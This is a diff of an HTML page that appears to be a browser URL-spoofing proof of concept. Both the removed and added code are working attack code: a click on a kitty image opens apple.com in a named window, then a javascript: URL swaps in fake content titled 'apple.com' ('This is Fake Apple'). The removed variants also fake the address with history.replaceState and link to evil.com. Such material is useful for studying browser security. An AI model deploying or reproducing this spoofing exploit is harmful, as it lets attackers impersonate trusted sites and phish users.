@@ -1,52 +1,16 @@
-<!-- <script>
-    function a() {
-        window.open(
-            "https://apple.com:9999", "x");
-        setTimeout(function () {
-            window.open(
-                "javascript:%0adocument.body.innerHTML='%3Ch1%20style%3Dcolor%3Ared%3E%3Cbr%3Einvalid%20url%20%3Cbr%3E%20%3Ca%20href%3Dhttps%3A%2F%2Fevil.com%3EGo%20to%20the%20original%20site%3C%2Fa%3E'",
-                "x");
-        }, 500);
-    }
-</script> -->
-
-
-<!-- <script>
-    function a() {
-        window.open("https://apple.com:9999", "x");
-        setTimeout(function () {
-            window.open(
-                "javascript:%0adocument.title='apple.com'%3B%0adocument.body.innerHTML='%3Ch1%20style%3D%22color%3A%20blue%3B%22%3EThis%20is%20apple%3C%2Fh1%3E'",
-                "x");
-        }, 500);
-    }
-</script> -->
-
-<!-- WORKS -->
-<!-- <script>
-    function a() {
-        window.open("https://apple.com:9999", "x");
-        setTimeout(function () {
-            window.open(
-                "javascript:%0alocation.href='data:text/html,%3Ctitle%3Eapple.com%3C/title%3E%3Ch1%20style%3D%22color%3Ablue%3B%22%3EThis%20is%20apple%3C/h1%3E'",
-                "x");
-        }, 500);
-    }
-</script> -->
-
-
 <script>
     function a() {
         window.open("https://apple.com:9999", "x");
         setTimeout(function () {
             window.open(
-                "javascript:%0ahistory.replaceState(null,'apple.com','https://apple.com/')%3B%0adocument.title='apple.com'%3B%0adocument.body.innerHTML='%3Ch1%20style%3D%22color%3Ablue%3B%22%3EThis%20is%20apple%3C/h1%3E'",
+                "javascript:%0alocation.href='data:text/html,%3Ctitle%3Eapple.com%3C/title%3E%3Ch1%20style%3D%22color%3Ared%3B%22%3EThis%20is%20Fake%20Apple%3C/h1%3E'",
                 "x");
-        }, 500);
+        }, 1000);
     }
 </script>
 
 
-
-<center><img style="width:25%;" src="https://i.pinimg.com/736x/31/df/42/31df428f76213c11d187391b2f683588.jpg"
-        onclick="a()"></center>
+<center>
+    <p style="margin-top: 50px;">Click this cute kitty to go to Apple!</p>
+    <img style="width:40%;" src="https://i.pinimg.com/736x/31/df/42/31df428f76213c11d187391b2f683588.jpg" onclick="a()">
+</center>
